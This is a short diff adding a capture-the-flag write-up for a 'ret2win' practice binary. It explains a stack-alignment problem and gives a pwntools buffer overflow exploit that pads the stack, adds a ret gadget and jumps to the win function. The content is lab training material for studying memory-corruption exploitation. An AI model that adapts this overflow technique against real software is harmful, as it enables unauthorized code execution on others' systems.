@@ -1,0 +1,15 @@
+This binary seems to be a simple buffer overflow and ret2win but it will not yeild results due the inconsistency of stack alignment
+
+So here is the code 
+
+from pwn import *
+
+
+bin = ELF("./ret2win")
+p=process(bin.path)
+p.recv()
+# payload = offset + main_ret_addr + win_addr
+pay = b'a'*0x28 + p64(0x4006e7) + p64(bin.sym.ret2win)
+p.sendline(pay)
+p.interactive()
+
